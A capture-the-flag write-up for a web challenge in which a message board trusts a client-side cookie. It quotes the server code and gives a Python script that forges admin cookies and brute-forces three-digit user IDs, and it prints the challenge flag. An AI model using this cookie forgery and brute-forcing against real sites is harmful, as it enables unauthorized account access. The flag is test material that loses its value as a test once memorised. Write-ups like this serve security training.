# web/message-board
### goose

Your employer, LameCompany, has lots of gossip on its company message board: message-board.hsc.tf. You, Kupatergent, are able to access some of the tea, but not all of it! Unsatisfied, you figure that the admin user must have access to ALL of the tea. Your goal is to find the tea you've been missing out on.

Your login credentials: username: kupatergent password: gandal

Server code is attached (slightly modified).
### Downloads
[message-board-master](Assets/message-board-master)

## Solution
### Discovery
First, we try logging in with the provided username and password. Once inside, we find that there is a cookie set
`userData=j%3A%7B%22userID%22%3A%22972%22%2C%22username%22%3A%22kupatergent%22%7D`<br/>
Decoding it from URL encoding gives us: 
`userData=j:{"userID":"972","username":"kupatergent"}`<br/><br/>
In the source code, under [app.js](Assets\message-board-master\message-board-1-master\app.js), we find an interesting chunk of code
```js
const users = [
    {
        userID: "972",
        username: "kupatergent",
        password: "gandal"
    },
    {
        userID: "***",
        username: "admin"
    }
]

app.get("/", (req, res) => {
    const admin = users.find(u => u.username === "admin")
    if(req.cookies && req.cookies.userData && req.cookies.userData.userID) {
        const {userID, username} = req.cookies.userData
        if(req.cookies.userData.userID === admin.userID) res.render("home.ejs", {username: username, flag: process.env.FLAG})
        else res.render("home.ejs", {username: username, flag: "no flag for you"})
    } else {
        res.render("unauth.ejs")
    }
})
```
This means that we need to set our cookie to have a 3-digit userID, with the username `admin`<br/>

### Brute-forcing
We create a short python script that sends GET requests, with cookies set, and iterating userID from 001 to 999<br/>
```python
import requests

url = 'https://message-board.hsc.tf'
for i in range(1000):
    if len(str(i))==1: a = "00"+str(i)
    elif len(str(i))==2: a = "0"+str(i)
    else: a = str(i)
    c = 'j%3A%7B%22userID%22%3A%22'+a+'%22%2C%22username%22%3A%22admin%22%7D'
    r = requests.get(url, cookies={'userData':c})
    if "no flag for you" not in r.text:
        print(r.text)
        break
    print(i)
```
Running it, we find out that the userID for admin is 767<br/>
We are also able to find the flag in the response

> flag{y4m_y4m_c00k13s}